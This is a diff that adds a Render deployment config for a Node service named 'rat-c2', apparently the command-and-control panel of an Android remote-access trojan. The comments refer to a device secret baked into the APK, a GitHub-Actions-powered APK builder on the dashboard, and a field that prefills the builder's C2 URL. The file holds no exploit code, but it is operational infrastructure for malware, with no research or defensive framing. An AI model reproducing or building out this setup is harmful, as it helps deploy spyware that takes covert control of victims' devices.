@@ -1,0 +1,30 @@
+services:
+  - type: web
+    name: rat-c2
+    runtime: node
+    plan: free
+    buildCommand: npm run build
+    startCommand: npm start
+    healthCheckPath: /health
+    envVars:
+      - key: NODE_ENV
+        value: production
+      - key: PORT
+        value: 10000
+      - key: DATABASE_URL
+        sync: false          # set manually in Render dashboard (Neon PostgreSQL)
+      - key: JWT_SECRET
+        generateValue: true
+      - key: ADMIN_USERNAME
+        sync: false          # set in Render dashboard
+      - key: ADMIN_PASSWORD
+        sync: false          # set in Render dashboard (bcrypt hash)
+      - key: DEVICE_SECRET
+        sync: false          # must match secret baked into APK
+      - key: GH_TOKEN
+        sync: false          # GitHub PAT (actions:write) — powers the dashboard APK builder
+      - key: GH_REPO
+        sync: false          # owner/repo containing build-apk.yml
+      - key: PUBLIC_C2_URL
+        sync: false          # optional — prefills builder C2 field
+        
